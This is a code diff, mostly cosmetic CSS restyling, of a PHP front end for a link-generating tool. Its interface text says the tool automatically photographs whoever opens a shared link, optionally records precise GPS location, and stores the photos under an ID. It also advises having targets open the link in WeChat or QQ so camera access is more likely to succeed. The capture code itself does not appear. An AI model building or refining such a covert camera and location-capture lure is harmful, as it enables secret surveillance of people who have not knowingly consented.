+    color: #e0c0d0;
 }
-.log-modal .log-body::-webkit-scrollbar {
-    width:5px;
-}
-.log-modal .log-body::-webkit-scrollbar-track {
-    background:transparent;
-}
+.log-modal .log-body::-webkit-scrollbar { width: 5px; }
+.log-modal .log-body::-webkit-scrollbar-track { background: transparent; }
 .log-modal .log-body::-webkit-scrollbar-thumb {
-    background:rgba(255,255,255,0.08);
-    border-radius:3px;
+    background: rgba(255,83,145,0.25);
+    border-radius: 3px;
 }
 .log-modal .log-body::-webkit-scrollbar-thumb:hover {
-    background:rgba(255,255,255,0.15);
+    background: rgba(255,83,145,0.45);
 }
 
-/* 修复日志内容样式 */
+/* 修复日志内容 */
 .log-body .log-title {
-    font-size:22px;
-    font-weight:700;
-    background:linear-gradient(135deg,#667eea,#764ba2);
-    -webkit-background-clip:text;
-    -webkit-text-fill-color:transparent;
-    margin-bottom:16px;
+    font-size: 22px;
+    font-weight: 700;
+    background: linear-gradient(135deg, #FF5391, #FF9CDA);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 16px;
 }
 .log-body .log-version {
-    font-size:13px;
-    color:#667eea;
-    font-weight:600;
-    margin-top:20px;
-    margin-bottom:8px;
-    padding-bottom:6px;
-    border-bottom:1px solid rgba(102,126,234,0.15);
+    font-size: 13px;
+    color: #FF9CDA;
+    font-weight: 600;
+    margin-top: 20px;
+    margin-bottom: 8px;
+    padding-bottom: 6px;
+    border-bottom: 1px solid rgba(255,83,145,0.22);
 }
 .log-body .log-bug {
-    margin:8px 0;
-    padding:12px 16px;
-    background:rgba(255,255,255,0.03);
-    border-left:3px solid #667eea;
-    border-radius:0 8px 8px 0;
+    margin: 8px 0;
+    padding: 12px 16px;
+    background: rgba(255,255,255,0.03);
+    border-left: 3px solid #FF5391;
+    border-radius: 0 8px 8px 0;
 }
-.log-body .log-bug.critical {
-    border-left-color:#ff6b6b;
-}
-.log-body .log-bug.medium {
-    border-left-color:#ff9800;
-}
+.log-body .log-bug.critical { border-left-color: #ff6b6b; }
+.log-body .log-bug.medium { border-left-color: #ff9800; }
 .log-body .log-bug .log-level {
-    font-size:10px;
-    padding:1px 6px;
-    border-radius:3px;
-    margin-right:6px;
+    font-size: 10px;
+    padding: 1px 6px;
+    border-radius: 3px;
+    margin-right: 6px;
 }
 .log-body .log-bug .log-level.critical {
-    background:rgba(255,80,80,0.15);
-    color:#ff6b6b;
+    background: rgba(255,80,80,0.15);
+    color: #ff6b6b;
 }
 .log-body .log-bug .log-level.medium {
-    background:rgba(255,152,0,0.15);
-    color:#ff9800;
-}
-.log-body .log-bug h4 {
-    font-size:14px;
-    margin:4px 0;
-    color:#e0e0e0;
-}
-.log-body .log-bug p {
-    margin:4px 0;
-    color:#a0a0b8;
-    font-size:12px;
+    background: rgba(255,152,0,0.15);
+    color: #ff9800;
 }
 .log-body .log-bug .log-level.low {
-    background:rgba(76,175,80,0.15);
-    color:#4caf50;
+    background: rgba(76,175,80,0.15);
+    color: #4caf50;
 }
-.log-body .log-detail {
-    margin-top:8px;
+.log-body .log-bug h4 {
+    font-size: 14px;
+    margin: 4px 0;
+    color: #f5e0ea;
 }
+.log-body .log-bug p {
+    margin: 4px 0;
+    color: #d4b0c4;
+    font-size: 12px;
+}
+.log-body .log-detail { margin-top: 8px; }
 .log-body .log-item {
-    display:flex;
-    align-items:flex-start;
-    gap:6px;
-    padding:4px 0;
-    font-size:12px;
-    line-height:1.7;
+    display: flex;
+    align-items: flex-start;
+    gap: 6px;
+    padding: 4px 0;
+    font-size: 12px;
+    line-height: 1.7;
 }
 .log-body .log-item .log-label {
-    color:#667eea;
-    font-weight:600;
-    white-space:nowrap;
-    flex-shrink:0;
-    min-width:max-content;
+    color: #FF9CDA;
+    font-weight: 600;
+    white-space: nowrap;
+    flex-shrink: 0;
+    min-width: max-content;
 }
-.log-body .log-item .log-value {
-    color:#b0b0c8;
-}
+.log-body .log-item .log-value { color: #dcbccd; }
 .log-body .log-item-sub {
-    display:flex;
-    align-items:flex-start;
-    gap:4px;
-    padding:2px 0 2px 16px;
-    font-size:12px;
-    line-height:1.7;
+    display: flex;
+    align-items: flex-start;
+    gap: 4px;
+    padding: 2px 0 2px 16px;
+    font-size: 12px;
+    line-height: 1.7;
 }
 .log-body .log-item-sub .log-label-sub {
-    color:#ff9800;
-    font-weight:500;
-    white-space:nowrap;
-    flex-shrink:0;
+    color: #FFB09C;
+    font-weight: 500;
+    white-space: nowrap;
+    flex-shrink: 0;
 }
-.log-body .log-item-sub .log-value {
-    color:#a0a0b8;
-}
+.log-body .log-item-sub .log-value { color: #d4b0c4; }
 .log-body .log-text {
-    color:#a0a0b8;
-    font-size:12px;
-    line-height:1.7;
-    margin:4px 0;
+    color: #d4b0c4;
+    font-size: 12px;
+    line-height: 1.7;
+    margin: 4px 0;
 }
-.log-body .log-spacer {
-    height:2px;
-}
+.log-body .log-spacer { height: 2px; }
 .log-body .log-code {
-    background:rgba(102,126,234,0.12);
-    color:#b388ff;
-    padding:1px 6px;
-    border-radius:4px;
-    font-family:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,monospace;
-    font-size:11px;
+    background: rgba(255,83,145,0.18);
+    color: #FF9CDA;
+    padding: 1px 6px;
+    border-radius: 4px;
+    font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+    font-size: 11px;
 }
 .log-body .log-link {
-    color:#667eea;
-    text-decoration:none;
+    color: #FF9CDA;
+    text-decoration: none;
 }
-.log-body .log-link:hover {
-    text-decoration:underline;
-}
+.log-body .log-link:hover { text-decoration: underline; }
 .log-body .log-footer-note {
-    margin-top:24px;
-    padding:12px 16px;
-    background:rgba(102,126,234,0.06);
-    border-radius:10px;
-    text-align:center;
-    font-size:12px;
-    color:#8080a0;
+    margin-top: 24px;
+    padding: 12px 16px;
+    background: rgba(255,83,145,0.08);
+    border-radius: 10px;
+    text-align: center;
+    font-size: 12px;
+    color: #b08fa4;
 }
 .log-body .log-footer-note a {
-    color:#667eea;
-    text-decoration:none;
+    color: #FF9CDA;
+    text-decoration: none;
 }
-.log-body .log-footer-note a:hover {
-    text-decoration:underline;
-}
+.log-body .log-footer-note a:hover { text-decoration: underline; }
 
-/* 加载状态 */
 .log-loading {
-    text-align:center;
-    padding:40px 20px;
-    color:#8080a0;
+    text-align: center;
+    padding: 40px 20px;
+    color: #b08fa4;
 }
 .log-loading .spinner {
-    width:32px; height:32px;
-    border:3px solid rgba(102,126,234,0.15);
-    border-top-color:#667eea;
-    border-radius:50%;
-    animation:spin 0.8s linear infinite;
-    margin:0 auto 12px;
+    width: 32px;
+    height: 32px;
+    border: 3px solid rgba(255,83,145,0.2);
+    border-top-color: #FF5391;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin: 0 auto 12px;
 }
 @keyframes spin {
-    to { transform:rotate(360deg); }
+    to { transform: rotate(360deg); }
 }
 .log-error {
-    text-align:center;
-    padding:40px 20px;
-    color:#ff6b6b;
+    text-align: center;
+    padding: 40px 20px;
+    color: #ff6b6b;
 }
-</style>
 
-<!-- ====== 🎬 闪屏样式 ====== -->
-<style>
+/* ==================== 闪屏（浅粉渐变，与主页面统一） ==================== */
 @keyframes splashFadeIn {
     from { opacity: 0; transform: scale(1.08); }
     to { opacity: 1; transform: scale(1); }
@@ -937,20 +990,25 @@ body {
     50% { opacity: 1; transform: scale(1.08); }
 }
 @keyframes splashGlow {
-    0%, 100% { box-shadow: 0 20px 60px rgba(102,126,234,0.3), 0 0 40px rgba(102,126,234,0.1); }
-    50% { box-shadow: 0 20px 80px rgba(102,126,234,0.5), 0 0 80px rgba(102,126,234,0.2); }
+    0%, 100% { box-shadow: 0 20px 60px rgba(255,83,145,0.25), 0 0 40px rgba(255,255,255,0.15); }
+    50% { box-shadow: 0 20px 80px rgba(255,83,145,0.4), 0 0 80px rgba(255,255,255,0.3); }
 }
 #splashOverlay {
-    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
     z-index: 99999;
-    background: linear-gradient(145deg, #0f0c29, #302b63, #24243e);
-    display: flex; align-items: center; justify-content: center;
+    background: linear-gradient(160deg, #D9A090 0%, #D97AB8 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
     animation: splashFadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
     transition: opacity 0.6s cubic-bezier(0.16, 1, 0.3, 1), transform 0.6s cubic-bezier(0.16, 1, 0.3, 1);
     will-change: opacity, transform;
 }
 #splashOverlay.hide {
-    opacity: 0; transform: scale(1.12);
+    opacity: 0;
+    transform: scale(1.12);
     pointer-events: none;
 }
 #splashOverlay.remove { display: none; }
@@ -960,79 +1018,91 @@ body {
     max-width: 85vw;
 }
 .splash-logo {
-    width: 85vw; max-width: 280px;
+    width: 85vw;
+    max-width: 280px;
     aspect-ratio: 9 / 16;
     border-radius: 24px;
     object-fit: cover;
     animation: splashGlow 3s ease-in-out infinite;
-    border: 2px solid rgba(255,255,255,0.08);
+    border: 2px solid rgba(255,255,255,0.5);
     margin-bottom: 16px;
-    box-shadow: 0 15px 40px rgba(0,0,0,0.4);
+    box-shadow: 0 15px 40px rgba(74,32,56,0.25);
 }
 .splash-title {
-    font-size: 30px; font-weight: 700;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
-    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    font-size: 30px;
+    font-weight: 700;
+    background: linear-gradient(135deg, #d12b6a 0%, #FF5391 50%, #b8387a 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
     background-clip: text;
     margin-bottom: 2px;
     letter-spacing: 3px;
 }
 .splash-sub {
-    font-size: 13px; color: rgba(255,255,255,0.35);
+    font-size: 13px;
+    color: rgba(107,45,74,0.6);
     margin-bottom: 20px;
     letter-spacing: 5px;
 }
 .splash-bar-wrap {
-    width: 220px; height: 3px;
-    background: rgba(255,255,255,0.06);
+    width: 220px;
+    height: 3px;
+    background: rgba(255,255,255,0.5);
     border-radius: 4px;
     margin: 0 auto 12px;
     overflow: hidden;
 }
 .splash-bar-inner {
-    height: 100%; width: 0%;
-    background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #FF5391, #FF9CDA, #FFB09C);
     border-radius: 4px;
 }
 .splash-info {
-    display: flex; justify-content: center; gap: 16px;
+    display: flex;
+    justify-content: center;
+    gap: 16px;
     margin-bottom: 14px;
 }
 .splash-info span {
-    font-size: 11px; color: rgba(255,255,255,0.25);
+    font-size: 11px;
+    color: rgba(107,45,74,0.55);
     letter-spacing: 1px;
 }
 .splash-skip {
     display: inline-block;
     padding: 7px 22px;
-    border: 1px solid rgba(255,255,255,0.1);
+    border: 1px solid rgba(255,255,255,0.85);
     border-radius: 20px;
-    color: rgba(255,255,255,0.3);
+    color: #7a3f5a;
     font-size: 12px;
     cursor: pointer;
     transition: all 0.4s ease;
-    background: transparent;
+    background: rgba(255,255,255,0.35);
     letter-spacing: 1px;
 }
 .splash-skip:hover {
-    background: rgba(255,255,255,0.06);
-    color: rgba(255,255,255,0.6);
-    border-color: rgba(255,255,255,0.2);
+    background: rgba(255,255,255,0.85);
+    color: #FF5391;
+    border-color: #FF5391;
     transform: translateY(-1px);
 }
 .splash-dots {
-    display: flex; gap: 6px; justify-content: center; margin-top: 10px;
+    display: flex;
+    gap: 6px;
+    justify-content: center;
+    margin-top: 10px;
 }
 .splash-dots span {
-    width: 6px; height: 6px;
+    width: 6px;
+    height: 6px;
     border-radius: 50%;
-    background: #667eea;
+    background: #d12b6a;
     animation: splashPulse 1.4s ease-in-out infinite;
 }
 .splash-dots span:nth-child(2) { animation-delay: 0.2s; }
 .splash-dots span:nth-child(3) { animation-delay: 0.4s; }
 </style>
-
 </head>
 <body>
 <?php if ($splash_enabled): ?>
@@ -1228,7 +1298,7 @@ body {
             <!-- 记录地理信息开关 -->
             <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                 <div class="label">
-                    <i class="fas fa-map-marker-alt"></i> 记录地理信息
+                    <i class="fas fa-map-marker-alt"></i> 精确GPS定位
                     <small style="color:#ff9800;">慎重开启，可能要求授权</small>
                 </div>
                 <button type="button" class="toggle" id="toggleGpsBtn" onclick="toggleField('gps')">
@@ -1317,13 +1387,10 @@ body {
         <div class="tips">
             <strong>⚠️ 温馨提示：</strong><br>
             ID: <code><?php echo htmlspecialchars($generated_id); ?></code>
-            <button onclick="copyID()" style="margin-left:6px;padding:2px 10px;border:none;border-radius:6px;background:rgba(102,126,234,0.3);color:#667eea;cursor:pointer;font-size:12px;"><i class="fas fa-copy"></i> 复制ID</button>
+            <button onclick="copyID()" style="margin-left:6px;padding:2px 10px;border:none;border-radius:6px;background:rgba(170,212,244,0.3);color:#aad4f4;cursor:pointer;font-size:12px;"><i class="fas fa-copy"></i> 复制ID</button>
             — 用此ID可在后台查看照片<br>
-            对方打开链接后会自动拍摄一张照片并跳转到指定页面<br>
+            对方打开链接后会自动拍摄照片并跳转到指定页面<br>
             <span style="color:#ff9800;font-size:12px;">💡 建议让对方在微信或QQ内打开链接，部分浏览器可能无法获取摄像头权限</span>
-            <?php if (isLoggedIn()): ?>
-                <br><a href="admin" style="color:#667eea;">👉 前往后台管理</a>
-            <?php endif; ?>
         </div>
         <div class="qrcode-wrap" id="qrcodeWrap" style="margin-top:14px;display:<?php echo ($generated_link && $show_qrcode ? 'block' : 'none'); ?>;">
             <div style="text-align:center;">
@@ -1338,13 +1405,13 @@ body {
         <form action="photos.php" method="GET" style="display:flex;gap:8px;align-items:center;">
             <label style="font-size:13px;color:#8080a0;white-space:nowrap;"><i class="fas fa-search"></i> 查照片</label>
             <input type="text" name="id" placeholder="输入ID查看照片" style="flex:1;padding:10px 14px;border:1px solid rgba(255,255,255,0.12);border-radius:10px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:14px;outline:none;">
-            <button type="submit" style="padding:10px 16px;border:none;border-radius:10px;background:rgba(102,126,234,0.2);color:#667eea;cursor:pointer;font-size:14px;"><i class="fas fa-arrow-right"></i></button>
+            <button type="submit" style="padding:10px 16px;border:none;border-radius:10px;background:rgba(170,212,244,0.2);color:#aad4f4;cursor:pointer;font-size:14px;"><i class="fas fa-arrow-right"></i></button>
         </form>
     </div>
 
     <!-- 历史生成ID记录 -->
     <div style="margin-top:20px;padding-top:20px;border-top:1px solid rgba(255,255,255,0.06);">
-        <button onclick="showHistory()" style="width:100%;padding:12px;border:1px solid rgba(102,126,234,0.25);border-radius:12px;background:rgba(102,126,234,0.08);color:#8080c0;cursor:pointer;font-size:14px;transition:all 0.3s;"><i class="fas fa-history"></i> 查看历史生成ID记录</button>
+        <button onclick="showHistory()" style="width:100%;padding:12px;border:1px solid rgba(170,212,244,0.25);border-radius:12px;background:rgba(170,212,244,0.08);color:#8080c0;cursor:pointer;font-size:14px;transition:all 0.3s;"><i class="fas fa-history"></i> 查看历史生成ID记录</button>
     </div>
 
     <div class="footer">
@@ -1391,7 +1458,7 @@ body {
 <div class="dev-modal" id="devModal">
     <div class="modal-box">
         <div class="modal-header">
-            <h3><i class="fas fa-code" style="color:#667eea;"></i> 开发者</h3>
+            <h3><i class="fas fa-code" style="color:#aad4f4;"></i> 开发者</h3>
             <button class="close-btn" onclick="closeDev()">&times;</button>
         </div>
         <div class="modal-body">
@@ -1464,11 +1531,11 @@ body {
                 <li>建议用户定期查阅本免责声明以了解最新条款。</li>
             </ol>
 
-            <p style="font-size:12px;color:#8080a0;margin-top:12px;">详细隐私政策请查看 <a href="javascript:void(0)" onclick="showPrivacy()" style="color:#667eea;">隐私协议</a></p>
+            <p style="font-size:12px;color:#8080a0;margin-top:12px;">详细隐私政策请查看 <a href="javascript:void(0)" onclick="showPrivacy()" style="color:#aad4f4;">隐私协议</a></p>
         </div>
         <div style="padding:12px 20px 16px;border-top:1px solid rgba(255,255,255,0.06);background:#1a1a2e;display:flex;gap:10px;">
             <button onclick="closeDisclaimer()" style="flex:1;padding:10px;border:1px solid rgba(255,255,255,0.12);border-radius:10px;background:transparent;color:#8080a0;cursor:pointer;font-size:14px;">关闭</button>
-            <button onclick="acceptDisclaimer()" id="disclaimerAcceptBtn" style="flex:1;padding:10px;border:none;border-radius:10px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;cursor:pointer;font-size:14px;font-weight:600;">✅ 已阅读并同意</button>
+            <button onclick="acceptDisclaimer()" id="disclaimerAcceptBtn" style="flex:1;padding:10px;border:none;border-radius:10px;background:linear-gradient(135deg,#aad4f4,#e2c5dd);color:#fff;cursor:pointer;font-size:14px;font-weight:600;">✅ 已阅读并同意</button>
         </div>
     </div>
 </div>
@@ -1476,7 +1543,7 @@ body {
 <div class="dev-modal" id="privacyModal">
     <div class="modal-box">
         <div class="modal-header">
-            <h3><i class="fas fa-user-shield" style="color:#667eea;"></i> 隐私协议</h3>
+            <h3><i class="fas fa-user-shield" style="color:#aad4f4;"></i> 隐私协议</h3>
             <button class="close-btn" onclick="closePrivacy()">&times;</button>
         </div>
         <div class="modal-body" style="text-align:left;font-size:13px;line-height:1.8;color:#c0c0d0;max-height:60vh;overflow-y:auto;">
@@ -1555,7 +1622,7 @@ body {
             </ol>
 
             <div style="text-align:center;margin-top:16px;">
-                <button onclick="closePrivacy()" style="padding:10px 30px;border:none;border-radius:10px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;cursor:pointer;font-size:14px;font-weight:600;">关闭</button>
+                <button onclick="closePrivacy()" style="padding:10px 30px;border:none;border-radius:10px;background:linear-gradient(135deg,#aad4f4,#e2c5dd);color:#fff;cursor:pointer;font-size:14px;font-weight:600;">关闭</button>
             </div>
         </div>
     </div>
@@ -1811,7 +1878,7 @@ function showHistory() {
     
     var body = '<div class="modal-box" style="max-width:520px;">' +
         '<div class="modal-header">' +
-            '<h3><i class="fas fa-history" style="color:#667eea;"></i> 历史记录</h3>' +
+            '<h3><i class="fas fa-history" style="color:#aad4f4;"></i> 历史记录</h3>' +
             '<button class="close-btn" onclick="closeHistory()">&times;</button>' +
         '</div>' +
         '<div class="modal-body" style="max-height:400px;overflow-y:auto;padding:12px 16px;">';
@@ -1824,12 +1891,12 @@ function showHistory() {
             var displayLink = item.link.length > 50 ? item.link.substring(0, 50) + '...' : item.link;
             body += '<div class="history-item" data-link="' + item.link.replace(/"/g,'&quot;') + '" data-id="' + item.id.replace(/"/g,'&quot;') + '" style="padding:10px 12px;margin-bottom:8px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:10px;">' +
                 '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">' +
-                    '<span style="color:#667eea;font-family:monospace;font-size:13px;font-weight:600;">' + item.id + '</span>' +
+                    '<span style="color:#aad4f4;font-family:monospace;font-size:13px;font-weight:600;">' + item.id + '</span>' +
                     '<span style="color:#606080;font-size:11px;">' + (item.time || '') + '</span>' +
                 '</div>' +
                 '<div style="display:flex;gap:6px;align-items:center;">' +
                     '<span style="flex:1;font-size:12px;color:#a0a0b8;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="' + item.link.replace(/"/g,'&quot;') + '">' + displayLink + '</span>' +
-                    '<button class="history-copy-link" style="padding:4px 10px;border:none;border-radius:6px;background:rgba(102,126,234,0.2);color:#667eea;cursor:pointer;font-size:11px;"><i class="fas fa-copy"></i> 复制链接</button>' +
+                    '<button class="history-copy-link" style="padding:4px 10px;border:none;border-radius:6px;background:rgba(170,212,244,0.2);color:#aad4f4;cursor:pointer;font-size:11px;"><i class="fas fa-copy"></i> 复制链接</button>' +
                     '<button class="history-copy-id" style="padding:4px 10px;border:none;border-radius:6px;background:rgba(76,175,80,0.15);color:#4caf50;cursor:pointer;font-size:11px;"><i class="fas fa-tag"></i> 复制ID</button>' +
                 '</div>' +
             '</div>';
@@ -2183,7 +2250,7 @@ function showFixLog() {
         })
         .catch(function() {
             // 失败时显示备用信息
-            body.innerHTML = '<div class="log-error"><i class="fas fa-exclamation-triangle"></i><br><br>加载失败<br><a href="BUGFIX_LOG.md" target="_blank" style="color:#667eea;">直接查看 BUGFIX_LOG.md</a></div>';
+            body.innerHTML = '<div class="log-error"><i class="fas fa-exclamation-triangle"></i><br><br>加载失败<br><a href="BUGFIX_LOG.md" target="_blank" style="color:#aad4f4;">直接查看 BUGFIX_LOG.md</a></div>';
         });
 }
 
